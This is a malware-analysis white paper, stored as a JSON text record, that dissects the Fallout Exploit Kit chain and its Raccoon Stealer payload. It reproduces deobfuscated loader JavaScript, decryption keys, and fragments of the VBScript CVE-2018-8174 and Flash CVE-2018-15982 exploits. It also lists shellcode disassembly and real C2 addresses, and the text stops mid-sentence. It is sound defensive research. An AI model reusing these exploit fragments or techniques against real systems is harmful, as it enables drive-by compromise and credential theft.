{
    "id": "22334728-0cc9-4557-9473-5ceadbb245df",
    "created_at": "2022-10-25T16:48:23.325308Z",
    "updated_at": "2025-03-27T02:15:41.657171Z",
    "deleted_at": null,
    "sha1_hash": "83c800c8e29a6ca6ee3375674ee26fd33a1e1527",
    "title": "",
    "authors": "",
    "file_creation_date": "2019-10-29T17:23:39Z",
    "file_modification_date": "2019-10-29T17:23:43Z",
    "file_size": 1956135,
    "plain_text": "# A close look at Fallout Exploit Kit and Raccoon Stealer\n\n\n-----\n\nWhite Paper\n\n### Contents\n\nTraffic analysis__________________________________________________________________________________________________4\n\nLanding page____________________________________________________________________________________________________5\n\nSecond stage____________________________________________________________________________________________________7\n\nVBScript exploit_ ________________________________________________________________________________________________9\n\nFlash exploit___________________________________________________________________________________________________ 11\n\nShellcode analysis_____________________________________________________________________________________________ 14\n\nPowerShell code_______________________________________________________________________________________________ 19\n\nRaccoon Stealer_______________________________________________________________________________________________ 20\n\nIndicators of Compromise______________________________________________________________________________________ 21\n\nReferences____________________________________________________________________________________________________ 22\n\n**Authors:**\n\nMihai NEAGU - Senior Security Researcher\n\nCosmin Mihai CARP - Security Researcher\n\n\n-----\n\nWhite Paper\n\n#### Over the last few months, we have seen increased Exploit Kit activity. One example is the Fallout Exploit Kit, which we will describe in depth in this article.\n\n Since its emergence in August 2018, threat actors have intensively used the Fallout Exploit Kit to deliver ransomware (GandCrab, Kraken, Maze, Minotaur, Matrix and Stop), Banker Trojans (DanaBot) and information stealers (RaccoonStealer, AZORult, Vidar), and others.\n\n Malicious ads have become a standard means for exploit kits to reach vulnerable systems. Because of the complex redirection chain provided by ad services, malicious ads remain an extremely effective attack vector to deliver exploits and, finally, malware.\n\n Both exploits delivered by Fallout Exploit Kit are blocked by Bitdefender before malware execution.\n\n\n-----\n\nWhite Paper\n\n### Traffic analysis\n\n[In our reports, we have seen that the initial redirection to the Fallout EK is performed via malvertising, using a dedicated ad](https://en.wikipedia.org/wiki/Malvertising)\n[server that provides malicious redirects. Visible as request #2 in Fiddler’s traffic dump, this is the starting point of the infection:](https://www.telerik.com/fiddler)\n\n\n**#** **Process** **Proto** **Host+URL** **Size** **Description**\n\n\n2 iexplore.exe HTTP 91.90.192.214/JwVDfp (redir) Malicious ad server\n\n4 iexplore.exe HTTPS yourfirmware.biz/spending/ … 4720 Landing page\n\n5 iexplore.exe HTTPS yourfirmware.biz/Prosar-689… 29182 Helper JS\n\n6 iexplore.exe HTTPS yourfirmware.biz/2016_11_22/… 7596 2nd stage JS\n\n8 iexplore.exe HTTPS yourfirmware.biz/Liyuan_Brechams… 28716 VBScript exploit\n\n10 iexplore.exe HTTPS yourfirmware.biz/7821/kTlV/… 35140 Flash exploit\n\n11 iexplore.exe HTTPS yourfirmware.biz/Darvon/Gambette… 5893 PowerShell script\n\n12 powershell.exe HTTP yourfirmware.biz/4960-Englut… 1568768 Malware payload\n\n14 pofke3lb.tmp HTTPS drive.google.com/uc?export=… (redir) Google Drive redirect\n\n16 pofke3lb.tmp HTTPS doc-0o-cc-docs.googleusercontent.com/docs/… 0 Empty file\n\n17 pofke3lb.tmp HTTP 34.77.205.80/gate/log.php 387 RaccoonStealer C2\n\n###### 18 pofke3lb.tmp HTTP 34.77.205.80/gate/sqlite3.dll 916735 Malware dependencies\n\n19 pofke3lb.tmp HTTP 34.77.205.80/gate/libs.zip 2828315 Malware dependencies\n\n\n20 pofke3lb.tmp HTTP 34.77.205.80/file_handler/file.php… 13 Data exfiltration\n\nFigure 1.1: Network traffic dump of Fallout EK activity and malware payload\n\nFrom the malicious ad, the browser is redirected to the exploit kit’s landing page (request #4). The page loads more JavaScript\n[(requests #5, #6), then VBScript and Flash exploits are delivered to vulnerable browsers (requests #8, #10).](https://en.wikipedia.org/wiki/VBScript)\n\nFinally, an encoded PowerShell script is downloaded and executed (request #11), which in turn downloads the malware\npayload (request #12) and launches it.\n\n[The malware is a password stealer Trojan, and requests #17-19 were identified by EKFiddle as RaccoonStealer C2. The](https://github.com/malwareinfosec/EKFiddle)\nTrojan sends computer configuration (request #17), downloads dependencies (requests #18, #19) and exfiltrates login and\ncrypto wallet credentials (request #20).\n\nLegitimate Malicious\n\nEK landing page Browser exploits Malware Data exfiltration\nwebsite ad\n\nFigure 1.2: Fallout EK infection chain\n\n\n-----\n\nWhite Paper\n\n### Landing page\n\nAfter being redirected through malvertising, the browser reaches the landing page at: hxxps://yourfirmware.biz/\nspending/beshield-garrottes/QFi.cfm\n\nThe URL is randomly generated, with approximately the following form: <domain>/<RandomWord>/\n\n[<RandomWord(s)/]<RandomChars>.<KnownExtension>\n\nThe URL can also contain fake URL encoded GET parameters, such as:\n...?<RandomChars>=<RandomWord|RandomDate>[&...]\n\nLanding page may have a known extension like cfm, cfml, dhtml, aspx and others.\n\nRandom English words, known file extensions and fake dates are used in these URLs to make it look similar to legit web\napplication queries, to evade pattern matching by URL scanners. Nothing is static in the Fallout EK’s URLs, so they can’t be\neasily recognized.\n\n**<meta name=”keywords” content=”kdBOVdNLc,SEabe,RZPEdzRlgl”** **/>**\n\n**<meta http-equiv=”x-ua-compatible” content=”IE=10”>**\n\n**<meta name=”description” content=”WIyoEihGanoZxb”** **/>**\n\n**<script type=”text/javascript” src=”/Prosar-689-patriot/13269/remill”></script>**\n\nThe “meta” declaration (x-ua-compatible, IE=10) makes Internet Explorer run in compatibility mode with version 10,\nso obsolete code (VBScript) can be loaded later. VBScript support has been removed from Internet Explorer 11 and up, as\n[described in the Microsoft article. This tells us we may encounter a VBScript exploit.](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/dn384057(v=vs.85))\n\nThe page body does not contain text, but two JavaScript scripts are being loaded, including one contained in the landing page\n(4KB) – the “main” JS – and one “helper” JS (29KB). They work together to perform the following actions.\n\nThe scripts are obfuscated, but we can still observe some things among the renamed functions and variables. Some used API\nfunctions are saved to variables, then invoked later:\n\nwindow.lIIIIlIl1l11 = window[“XMLHttpRequest”];\n\nwindow.I1l1ll11I = window[“eval”];\n\nwindow.I1II1 = window[“JSON”][“parse”];\n\nwindow.lI1lIII = window[“JSON”][“stringify”];\n\nFrom this code, we can tell a JSON object will be involved, and dynamic request(s) will be sent from JavaScript, using\n[XMLHttpRequest. Also, the critical function eval will be used, with dynamic JavaScript code being executed.](https://www.w3schools.com/xml/xml_http.asp)\n\nHowever, the rest of the code is highly obfuscated:\n\n**var I1I1IIIlI1 =** ‚KY1Zxq4vckTyY‘ + ‚J6W1Jpxfs0VILlBh‘;\n\n**var l1IllI11 = window[‚IIIllII1Illl‘][‚lI1lIIlI‘][‚llIlIlI‘][‚llII1‘](16)[‚IIlI1Il1‘]();**\n\n**var I1IlIllI1l11 = window[‚llll1I‘](window[‚IIIllII1Illl‘][‚lI1lIIlI‘][‚llIlIlI‘][‚llII1‘]**\n(16)[‚IIlI1Il1‘](), 16);\n\n**var l11IlII1I = window[‚llll1I‘](window[‚IIIllII1Illl‘][‚lI1lIIlI‘][‚llIlIlI‘][‚llII1‘](16)**\n\n[‚IIlI1Il1‘](), 16);\n\n**var III1I = window[‚llll1I‘](window[‚IIIllII1Illl‘][‚lI1lIIlI‘][‚llIlIlI‘][‚llII1‘](16)**\n\n[‚IIlI1Il1‘](), 16);\n\n**var lIIIIIIIIIl1 = I1IlIllI1l11[‚I11IlI1lIII‘](l11IlII1I, III1I);**\n\n**var I11lI11 = window[‚String‘][‚fromCharCode‘](118,** 71, 120, 88, 90, 118, 77) + ‚ZMaPaX4‘;\n\n**var ll1III11 =** **new window[‚lIIIIlIl1l11‘]();**\n\nAfter removing garbage code, resolving syntax obfuscation tricks and recognizing third-party library code embedded in the\n“helper” JS, we can finally rename obfuscated functions and variables closer to the original names:\n\n**var iv_str =** Crypto.lib.WordArray.random(16).toString();\n\n**var base =** Bignum(Crypto.lib.WordArray.random(16).toString(), 16);\n\ni ( lib d d (16) S i () 16)\n\n\n-----\n\nWhite Paper\n\n**var public_key =** base.powMod(exponent, modulo);\n\n**var request =** **new** XMLHttpRequest();\n\n[...]\n\nrequest.open(“post”, URL, **true);**\n\n**var requestJson =** {};\n\nrequestJson[‚base‘] = base.toString(16);\n\nrequestJson[‚modulo‘] = modulo.toString(16);\n\nrequestJson[‚public_key‘] = public_key.toString(16);\n\nrequestJson[‚iv‘] = iv_str;\n\nrequestJson[‚browserInfo‘] = ‚@@‘ browserInfo();\n\nrequest.send(Crypto.AES.encrypt(JSON.stringify(requestJson), FalloutKey, {iv: FalloutIV}).\ntoString());\n\n[As we see, a Diffie-Hellman key exchange is taking place, with transmitted information packed into JSON objects, encrypted](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange)\n[with AES-128 algorithm in CBC mode. The EK authors chose Diffie-Hellman as a defense against man-in-the-middle traffic](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)\nscanning.\n\nUsing an XMLHttpRequest, encrypted HTML is downloaded, then decrypted and executed using the eval function:\n\nrequest.onreadystatechange = **function() {**\n\n**if (4** === **this.readyState** && 200 === **this.status) {**\n\n**var text =** Crypto.AES.decrypt(request.responseText, FalloutKey,\n\n{iv: FalloutIV}).toString(Crypto.enc.Utf8);\n\n**var responseJson =** JSON.parse(text);\n\n**var base =** Bignum(responseJson[‚base‘], 16);\n\n**var public_key_2 =** Crypto.enc.Hex.parse(base.powMod(exponent, modulo).toString(16));\n\n**var iv =** Crypto.enc.Hex.parse(iv_str);\n\n**var decrypted_js_bin =** window.Crypto.AES.decrypt(responseJson[‚code‘],\n\npublic_key_2, {iv: iv});\n\n**var code =** decrypted_js_bin.toString(Crypto.enc.Utf8);\n\neval(code);\n\n}};\n\nThe URL where the request is made is decrypted in the “helper” JavaScript using fixed values for encryption key and initial\nvector:\n\nwindow.FalloutKey = Crypto.enc.Hex.parse(“cb9f989b5ec9c6061912af37709fe309 “);\n\nwindow.FalloutIV = Crypto.enc.Hex.parse(“9b41656001881cd01e85d0fa8a9b5733”);\n\nwindow.URL = Crypto.AES.decrypt(\n\n“38YEyt6HcpQna7gKhki+tJB+PuX7ydy+GgSoGJ2qdAB10zRCOLpjLIR0FYfXwrzj”,\n\nFalloutKey, {iv: FalloutIV}).toString(Crypto.enc.Utf8);\n\nWe can decrypt the second stage URL by writing a small Python script:\n\nkey = binascii.unhexlify(‚cb9f989b5ec9c6061912af37709fe309‘)\n\niv = binascii.unhexlify(‚9b41656001881cd01e85d0fa8a9b5733‘)\n\nencrypted = binascii.a2b_\nbase64(‚38YEyt6HcpQna7gKhki+tJB+PuX7ydy+GgSoGJ2qdAB10zRCOLpjLIR0FYfXwrzj‘)\n\ndecrypted = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_CBC, iv).decrypt(encrypted)\n\n_# Result: /2016_11_22/Enactor-oxyazo/sleepings_\n\n\n-----\n\nWhite Paper\n\n### Second stage\n\nThe second stage consists of a new JavaScript code block being downloaded, decrypted and executed using the eval\nfunction. As it’s not being saved to any file, it won’t be scanned by on-access engines. The decrypted second stage JS code\nlooks like this:\n\n**var lII111ll1I1I = window[“IIIllII1Illl”][“l1llI1”][“lIll111Il”](**\n“ArF5GSkkkIywftyyV9YsYhSRgQaE7Z596Gi3uyPh4m/h/ge8qWRd3dt0UUXkiOvJauThEg8N4iNmrOdG+wbQW/\nYRdbAAhSkgzAJwYtvwTiI=”, lII11II, {lI1Illll: I1I11II}) [“IIlI1Il1”](window[“IIIllII1Illl”]\n\n[“IIll1llI1I”][“l1Il1llI11l”]);\n\n**function** ll1ll() {\n\n**var l1IllI11 = window[‚IIIllII1Illl‘][‚lI1lIIlI‘][‚llIlIlI‘][‚llII1‘](16)[‚IIlI1Il1‘]();**\n\n**var I1IlIllI1l11 = window[‚llll1I‘]( window[‚IIIllII1Illl‘][‚lI1lIIlI‘][‚llIlIlI‘]**\n\n[‚llII1‘](16)[‚IIlI1Il1‘](), 16);\n\n**var l11IlII1I = window[‚llll1I‘]( window[‚IIIllII1Illl‘][‚lI1lIIlI‘][‚llIlIlI‘][‚llII1‘]**\n(16)[‚IIlI1Il1‘](), 16);\n\n**var III1I = window[‚llll1I‘]( window[‚IIIllII1Illl‘][‚lI1lIIlI‘][‚llIlIlI‘][‚llII1‘](16)**\n\n[‚IIlI1Il1‘](), 16);\n\n**var lIIIIIIIIIl1 = I1IlIllI1l11[‚I11IlI1lIII‘](l11IlII1I, III1I)**\n\nAfter code deobfuscation, we see that it decrypts the URL, with the same key and IV as before:\n\nvar URL2 = Crypto.AES.decrypt( ‚ArF5GSkkkIywftyyV9YsYhSRgQaE7Z596Gi3uyPh4m/h/\nge8qWRd3dt0UUXkiOvJauThEg8N4iNmrOdG+wbQW/YRdbAAhSkgzAJwYtvwTiI=‘, FalloutKey, {iv:\nFalloutIV}).toString(Crypto.enc.Utf8)\n\n_# Result: /Liyuan_Brechams/Quibbling_10371_12600.cfm?aIVz=Explainer-subcuboid_\n\nThe same communication method as in the 1st stage is used, with another Diffie-Hellman key exchange taking place,\nencrypted JSON sent and encrypted data received. Two HTML blocks are decrypted, then added as new frames to the original\npage:\n\n**var codeA_bin =** Crypto.AES.decrypt(responseJson[‚codeA‘], public_key_2_bin, {iv: iv});\n\n**var codeB_bin =** Crypto.AES.decrypt(responseJson[‚codeB‘], public_key_2_bin, {iv: iv});\n\n[...]\n\n**if (codeB.length** !== 0) {\n\n**var frame1 =** document.createElement(“iframe”);\n\nframe1.setAttribute(“id”, “frame1id”);\n\ndocument.getElementsByTagName(“BODY”)[0].appendChild(frame1);\n\n**var doc1 =** document.getElementById(“frame1id”).contentWindow.document;\n\ndoc1.open();\n\ndoc1.write(codeB_bin.toString(Crypto.enc.Utf8));\n\ndoc1.close();\n\n}\n\n**if (codeA.length** !== 0) {\n\n**var frame2 =** document.createElement(“iframe”);\n\nframe2.setAttribute(“id”, “frame2id”);\n\ndocument.getElementsByTagName(“BODY”)[0].appendChild(frame2);\n\n**var doc2 =** document.getElementById(“frame2id”).contentWindow.document;\n\ndoc2.open();\n\ndoc2.write(codeA_bin.toString(Crypto.enc.Utf8));\n\ndoc2.close();\n\n}\n\nThe two HTML frames contain the VBScript exploit code and Flash exploit object instantiation code.\n\n\n-----\n\nWhite Paper\n\n### VBScript exploit\n\nThe first HTML that is decrypted and inserted as <iframe> to the document after the second stage contains the VBScript\nexploit code. Looking through it, we see a function named UAF with the following content:\n\nSub UAF\n\nFor IIIl=(&hfe8+3822-&H1ed6) To (&h8b+8633-&H2233)\n\nSet IIllI(IIIl)=New IIIlIl\n\nNext\n\nFor IIIl=(&haa1+6236-&H22e9) To (&h1437+3036-&H1fed)\n\nSet IIllI(IIIl)=New llIIl\n\nNext\n\nIllI=0\n\nFor IIIl=0 To 6\n\nReDim lIIl(1)\n\nSet lIIl(1)=New cla1\n\nErase lIIl\n\nNext\n\nSet llll=New llIIl\n\nIllI=0\n\nFor IIIl=0 To 6\n\nReDim lIIl(1)\n\nSet lIIl(1)=New cla2\n\nErase lIIl\n\nNext\n\nSet IIIIl=New llIIl\n\nEnd Sub\n\n[This code is fairly obfuscated, but we can see that it is almost identical to the VBScript code residing in the Metasploit module:](https://www.metasploit.com/)\n[CVE-2018-8174.rb by 0x09AL and another one on exploit-db.com, published by “smgorelik”.](https://github.com/0x09AL/CVE-2018-8174-msf)\n\n[Using these similarities, we can identify the exploit as targeting the VBScript engine use-after-free vulnerability CVE-2018-8174.](https://nvd.nist.gov/vuln/detail/CVE-2018-8174)\n\nThe Metasploit module code originates from the 0-day sample used in the APT attack described by Qihoo 360 in the April 2018\n[paper “New Office Attack Using Browser ‘Double Kill’ Vulnerability”. Further analysis was also published by other researchers](https://www.weibo.com/ttarticle/p/show?id=2309404230886689265523)\n[here, here, here, here, here and here.](https://securelist.com/root-cause-analysis-of-cve-2018-8174/85486/)\n\nAfter deobfuscating class and variable names, as well as numerical values, the interesting code from the function becomes:\n\nFor i = 0 To 6\n\nReDim Arr1(1)\n\nSet Arr1(1) = New cla1\n\nErase Arr1\n\nNext\n\nWe can see a reference to cla1 being saved in array Arr1, then array is destroyed. Because of the vulnerability, the cla1\nmemory is eventually freed, even though a reference still exists in variable Arr2. This reference is then reused in the custom\ndefined Class_Terminate destructor.\n\nClass cla1\n\nPrivate Sub Class_Terminate()\n\nSet Arr2(counter) = Arr1(1)\n\ncounter = counter + 1\n\nArr1(1) = 1\n\nEnd Sub\n\n\n-----\n\nWhite Paper\n\nCONTEXT structure are used to change the stack pointer to a new location (stack pivot). From there, using the new “prepared\nstack” will result in calling VirtualProtect on the shellcode and return to it:\n\nFunction WrapShellcodeWithNtContinueContext(ShellcodeAddrParam)\n\nDim bytes\n\nbytes = String(34798, Unescape(“%u4141”))\n\nbytes = bytes & EscapeAddress(ShellcodeAddrParam) ‚ return address = shellcode address\n\nbytes = bytes & EscapeAddress(ShellcodeAddrParam) ‚ VirtualProtect address: shellcode\n\nbytes = bytes & EscapeAddress(&H3000) ‚ VirtualProtect size: 0x3000 bytes\n\nbytes = bytes & EscapeAddress(&H40) ‚ VirtualProtect protection: 0x40 = RWX\n\nbytes = bytes & EscapeAddress(ShellcodeAddrParam - 8) ‚ VirtualProtect oldProt\n\nbytes = bytes & String(6, Unescape(“%u4242”))\n\nbytes = bytes & PackedNtContinueAddress()\n\nbytes = bytes & String((&H80000 - LenB(bytes)) / 2, Unescape(“%u4141”))\n\nWrapShellcodeWithNtContinueContext = bytes\n\nEnd Function\n\nThe shellcode bytes can be seen stored into an escaped string. We can see the start of the shellcode bytes 55 8B EC as the\nstandard function prologue:\n\nFunction GetShellcode()\n\nbytes = Unescape(“%u0000%u0000%u0000%u0000”) &\nUnescape(“%u8B55%u83EC%uF8E4%uEC81%u00CC%u0000%u5653[...]” & lIIII(IIIII(“”)))\n\nbytes = bytes & String((&H80000 - LenB(bytes)) / 2, Unescape(“%u4141”))\n\nGetShellcode = bytes\n\nEnd Function\n\nBinary code execution is indirectly obtained by changing confused object type to 77 (0x4D), also mentioned by 360 Core\n[Security in their exploit description. This is not a documented VBScript type, but has the property that calling the VAR::Clear](http://blogs.360.cn/post/cve-2018-8174-en.html)\nmethod of that type will also call the destructor method stored at offset +8 of variable descriptor:\n\nSetCurrentMemValueUint32 ExpandWithVirtualProtect(ShellcodeWrapped) ‚ [pointer+8]=shellcode\n\n[...]\n\ntypeConfusionObject.arbitraryMemoryAccess(pointer) = 77 ‚ set object type to 77\n\ntypeConfusionObject.arbitraryMemoryAccess(pointer + 8) = 0 ‚ execute [pointer+8]\n\n\n-----\n\nWhite Paper\n\n### Flash exploit\n\nThe second HTML decrypted and evaluated in the second stage is the object instantiation code for the Flash exploit:\n\n**<object classid=”clsid:d27cdb6e-ae6d-11cf-96b8-444553540000”**\n\nwidth=”557” height=”283” id=”ryPYyaMwLnx” align=”middle”>\n\n**<param name=”movie” value=”/7821/kTlV/19_07_1935/2971?dprLuf=AD7”** **/>**\n\n**<param name=”quality” value=”high”** **/>**\n\n**<param name=”bgcolor” value=”#ffffff”** **/>**\n\n[...]\n\n**</object>**\n\n[Opening or dumping the file using JPEXS Free Flash Decompiler, we can observe 13,664 bytes of binary data in resources,](https://www.free-decompiler.com/flash/)\nalong with two 16-byte blobs.\n\nWe can also observe that an encryption library containing AES algorithm is used, and we suspect that the two blobs are the\n128-bit key and initial vector.\n\nJPEXS Free Flash Decompiler v.11.2.0\n\n-----------------------------------\nExporting images...\n\nExporting shapes...\n\n[...]\n\nExported binarydata 1/3 DefineBinaryData (3: _0x14efb0cf)\n\nExported binarydata 2/3 DefineBinaryData (2: _0x91257d46)\n\nExported binarydata 3/3 DefineBinaryData (1: _0xae12e14a)\n\n[...]\n\nExported script 7/32 com.hurlant.crypto.symmetric.IMode, 00:00.053\n\nExported script 6/32 com.hurlant.crypto.symmetric.IPad, 00:00.054\n\nExported script 1/32 com.hurlant.crypto.symmetric.ICipher, 00:00.056\n\nExported script 3/32 com.hurlant.crypto.symmetric.ISymmetricKey, 00:00.057\n\nExported script 9/32 com.hurlant.crypto.symmetric.CBCMode, 00:00.073\n\n[...]\n\nExported script 4/32 com.hurlant.crypto.symmetric.AESKey, 00:00.173\n\nExport finished. Total export time: 00:00.483\n\nOK\n\nWe can decrypt the data using a small Python script:\n\nfrom Crypto.Cipher import AES\n\niv = open(‚2.bin‘, ‚rb‘).read()\n\nkey = open(‚3.bin‘, ‚rb‘).read()\n\ndata = open(‚1.bin‘, ‚rb‘).read()\n\nobj = AES.new(key, AES.MODE_CBC, iv)\n\ndecrypted = obj.decrypt(data)\n\nopen(‚4.bin‘, ‚w+b‘).write(decrypted)\n\nThe decrypted data is another Flash file, evaluated at runtime. This is a common way to hide the actual exploitation code. The\nexploit code is unpacked in memory and executed, bypassing on-access scanning.\n\nThe code handling the decryption is obfuscated, but the flash.display.Loader class is mentioned in the imported Flash\n\n\n-----\n\nWhite Paper\n\n**public** **static** **var _0xa20c29c4:Array = [**\n\n“flash.system.LoaderContext”,\n\n“flash.display.Sprite”,\n\n“flash.display.Stage”,\n\n“flash.utils.ByteArray”,\n\n“flash.display.Loader”,\n\n“flash.Lib”,\n\n“flash.Vector”,\n\n“flash.system.ApplicationDomain”,\n\n“flash.display.LoaderInfo”,\n\n“flash.events.Event”,\n\n“flash.net.URLRequest”,\n\n“flash.net.URLRequestHeader”,\n\n“flash.net.URLLoader”\n\n];\n\n[Next, we are interested in confirming the target vulnerability. The tested Flash version was 31.0.0.153 so we expect to see CVE-](https://nvd.nist.gov/vuln/detail/CVE-2018-15982)\n[2018-15982, so we will check the exploit code.](https://nvd.nist.gov/vuln/detail/CVE-2018-15982)\n\n[The vulnerability was described in detail by 360 Core Security in the “Operation Poison Needles” paper on December 5, 2018,](http://blogs.360.cn/post/PoisonNeedles_CVE-2018-15982_EN)\nafter it was abused as part of an APT attack.\n\nIndeed, we find code that resembles the described 0-day in that paper. For example, we see exploit code traversing a vector\nand finding corrupted objects by checking their size (24), then saving their index:\n\n**while(_loc1_ < this.Var9)**\n\n{\n\n**if(this.Var14[_loc1_].Var39 != 24 && this.Var14[_loc1_].Var39 > 524288)**\n\n{\n\nthis.Var12 = _loc1_;\n\nthis.Var10 = this.Var14[_loc1_].Var22;\n\nthis.Var6 = true;\n\n**break;**\n\n}\n\n_loc1_++;\n\n}\n\nWe also see the read/write primitive on 64-bit environments, after the corruption has taken place, very similar to the published\n[analysis. This way we can confirm it’s a case of CVE-2018-15982:](https://nvd.nist.gov/vuln/detail/CVE-2018-15982)\n\n**private** **function** Var42(param1:Class0) : uint\n\n{\n\n**var _loc2_:uint = 0;**\n\nthis.Var14[this.Var12].Var22 = param1.Var98;\n\nthis.Var14[this.Var12].Var39 = param1.Var99 - 32;\n\n_loc2_ = this.Var16[this.Var13].m_Class1.Var993;\n\nthis.Var14[this.Var12].Var22 = this.Var11.Var98;\n\nthis.Var14[this.Var12].Var39 = this.Var11.Var99;\n\n**return _loc2_;**\n\n}\n\n**private** **function** Var38(param1:Class0, param2:uint) : void\n\n{\n\nthis.Var14[this.Var12].Var22 = param1.Var98;\n\nthis.Var14[this.Var12].Var39 = param1.Var99 - 32;\n\n\n-----\n\nWhite Paper\n\nthis.Var14[this.Var12].Var22 = this.Var11.Var98;\n\nthis.Var14[this.Var12].Var39 = this.Var11.Var99;\n\n}\n\nInterestingly, the Flash exploit contains both 32-bit and 64-bit shellcodes, while the VBScript exploit was only 32-bit. While very\nsimilar to the shellcode we found on the VBScript exploit, it will download and execute a command from a different URL, on the\nsame domain. The author likely wanted to differentiate between successful VBScript and Flash exploitations.\n\nShellcode execution is performed differently from the VBScript exploit described earlier. Here, code execution is achieved by\nreplacing a Flash object method’s address with the address of VirtualProtect function, and calling that with desired parameters\n[directly from within Flash code, rather than performing a ROP attack. This method, first used by Hacking Team, is described in](https://en.wikipedia.org/wiki/Hacking_Team)\n[the CVE-2015-5119 analysis by Zscaler.](https://www.zscaler.com/blogs/research/adobe-flash-vulnerability-cve-2015-5119-analysis)\n\n[Indeed, we can see in WinDBG that the VirtualProtect function is called from Flash module, and the stack pointer was](https://en.wikipedia.org/wiki/WinDbg)\n[unaffected. Its address remains within the limits declared by Thread Environment Block:](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb?redirectedfrom=MSDN)\n\neax=046db580 ebx=00006370 ecx=0b34747c edx=0baa108c esi=0f59b238 edi=0b34747c\n\neip=75ce1b2f esp=046db558 ebp=046db578 iopl=0     nv up ei pl nz na pe nc\n\ncs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000       efl=00200206\n\nKERNELBASE!VirtualProtect:\n\n75ce1b2f 8bff      mov   edi,edi\n\n0:010> dd esp\n\n046db558 58710a62 0baa1004 00006370 00000040\n\n046db568 046db618 00000004 046db610 00000001\n\n[...]\n\n0:010> kb\n\nChildEBP RetAddr Args to Child\n\n046db554 58710a62 0baa1004 00006370 00000040 KERNELBASE!VirtualProtect\n\n046db578 586e8efa 0baa1004 046db618 00000040 Flash32_31_0_0_153!IAEModule_IAEKernel_\nUnloadModule+0x2b39f2\n\n046db598 586ef688 0b51b3e8 00000041 046db610 Flash32_31_0_0_153!IAEModule_IAEKernel_\nUnloadModule+0x28be8a\n\n[...]\n\n0:010> !teb\n\nTEB at 7ffd4000\n\nExceptionList:    046dc5a4\n\nStackBase:      046e0000\n\nStackLimit:      046ce000\n\nSubSystemTib:     00000000\n\nFiberData:      00001e00\n\n[...]\n\n\n-----\n\nWhite Paper\n\n### Shellcode analysis\n\nJudging from a first look, the shellcode may have been written in C, because each function creates a new stack frame, using\n[function prologue/epilogue. Most functions use the fastcall calling convention, which is uncommon. This makes the code](https://docs.microsoft.com/en-us/cpp/cpp/fastcall?view=vs-2019)\nharder to analyze, as the first two function parameters are passed in registers ecx and edx, not on stack.\n\nThe first thing the shellcode needs is to import desired API functions. To do that, the module kernel32.dll is located, by\n[parsing the Process Environment Block structure, then walking the loaded module linked list. First the loaded module is the](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)\napplication executable, e.g. iexplore.exe. Going from this list item to its forward link, the shellcode will find ntdll.dll.\nGoing forward link again will find kernel32.dll:\n\n01000289         get_kernel32_base proc near     ; CODE XREF: import_\nfunctions+10p\n\n01000289 64 A1 30 00 00 00   mov   eax, large fs:30h   ; PEB\n\n0100028F 8B 40 0C        mov   eax, [eax+0Ch]    ; ntdll!PebLdr\n\n01000292 8B 40 14        mov   eax, [eax+14h]    ; Ldr.InMemoryOrderModuleList\n\n01000295 8B 00         mov   eax, [eax]      ; LIST_ENTRY.flink\n\n01000297 8B 00         mov   eax, [eax]      ; LIST_ENTRY.flink\n\n01000299 8B 40 10        mov   eax, [eax+10h]    ; LIST_ENTRY.DllBase\n\n0100029C C3           retn\n\n0100029C         get_kernel32_base endp\n\nHaving located the desired module, the shellcode enumerates its Export Address Table. Avoiding comparing strings\n(which would make reversing easier), the shellcode makes hashes on function names instead, then compares those:\n\n0100022C 8B F9         mov   edi, ecx        ; ecx = imageBase\n\n0100022E 89 55 FC        mov   [ebp+arg0_hash], edx  ; edx = nameHash\n\n01000231 33 F6         xor   esi, esi        ; index\n\n01000233 8B 47 3C        mov   eax, [edi+3Ch]     ; AddressOfNewExeHeader\n\n01000236 8B 5C 38 78      mov   ebx, [eax+edi+78h]   ; IMAGE_DATA_DIRECTORY Export\n\n0100023A 03 DF         add   ebx, edi\n\n0100023C 8B 43 1C        mov   eax, [ebx+1Ch]     ; AddressOfFunctions\n\n0100023F 8B 4B 20        mov   ecx, [ebx+20h]     ; AddressOfNames\n\n01000242 03 C7         add   eax, edi\n\n01000244 89 45 F0        mov   [ebp+var_AddrOfFuncs], eax\n\n01000247 03 CF         add   ecx, edi\n\n01000249 8B 43 24        mov   eax, [ebx+24h]     ; AddressOfNameOrdinals\n\n0100024C 03 C7         add   eax, edi\n\n0100024E 89 4D F8        mov   [ebp+var_AddrOfNames], ecx\n\n01000251 89 45 F4        mov   [ebp+var_AddrOfOrdinals], eax\n\n01000254 39 73 18        cmp   [ebx+18h], esi     ; loop from 0 to\nNumberOfNames\n\n01000257 76 18         jbe   short loc_1000271\n\n01000259     loc_1000259:                 ; CODE XREF: get_function_\nby_hash+4C↓j\n\n01000259 8B 0C B1        mov   ecx, [ecx+esi*4]\n\n0100025C 03 CF         add   ecx, edi        ; ecx = imageBase +\naddrOfNames[index]\n\n0100025E E8 7B FF FF FF     call  hash_string       ; hash function name\n\n01000263 3B 45 FC        cmp   eax, [ebp+arg0_hash]  ; compare with target name\n\n01000266 74 10         jz   short loc_1000278\n\n01000268 8B 4D F8        mov   ecx, [ebp+var_AddrOfNames]\n\n0100026B 46           inc   esi\n\n0100026C 3B 73 18        cmp   esi, [ebx+18h]\n\n0100026F 72 E8         jb   short loc_1000259\n\n\n-----\n\nWhite Paper\n\n0100068D E8 F7 FB FF FF     call  get_kernel32_base   ; eax = kernel32 base\n\n01000692 8B F8         mov   edi, eax\n\n01000694 BA 43 04 1C 19     mov   edx, 191C0443h    ; kernel32!CloseHandle\n\n01000699 8B CF         mov   ecx, edi\n\n0100069B E8 83 FB FF FF     call  get_function_by_hash\n\n010006A0 8B 36         mov   esi, [esi]\n\n010006A2 BA 75 05 B9 28     mov   edx, 28B90575h    ; kernel32!CreateProcessA\n\n010006A7 8B CF         mov   ecx, edi\n\n010006A9 89 46 14        mov   [esi+14h], eax\n\n010006AC E8 72 FB FF FF     call  get_function_by_hash\n\n010006B1 8B 75 FC        mov   esi, [ebp+ptr_funcs_kernel32]\n\n010006B4 BA 51 09 32 73     mov   edx, 73320951h    ;\nkernel32!CreateToolhelp32Snapshot\n\n010006B9 8B 0E         mov   ecx, [esi]\n\n[...]\n\nUsing the name hash method, the following functions are imported at specified byte index in the address 